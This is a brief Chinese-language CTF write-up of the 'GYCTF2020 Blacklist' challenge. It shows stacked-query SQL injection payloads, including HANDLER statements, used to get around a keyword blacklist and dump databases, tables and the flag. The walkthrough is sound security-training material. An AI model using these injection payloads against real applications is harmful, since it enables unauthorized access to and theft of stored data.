# [GYCTF2020]Blacklist 1

- 进入网页，输入 `1'` 出现报错，确定单引号闭合，接着输入 `1' union select 1,2#` 出现 `return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`

> <img src="../../IMG2/Screenshot 2024-06-05 210737.png">

- 可以看出很多的关键字都被屏蔽了，无法使用普通注入方式，接着尝试堆叠注入，注入成功

`1';show databases;`

> <img src="../../IMG2/Screenshot 2024-06-05 210853.png">

- 爆表，出现 `FlagHere`

`1';show tables;`

> <img src="../../IMG2/Screenshot 2024-06-05 211000.png">

- 这里查询数据就不能使用prepare了，使用handler得到flag

`1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;`

> <img src="../../IMG2/Screenshot 2024-06-05 211315.png">

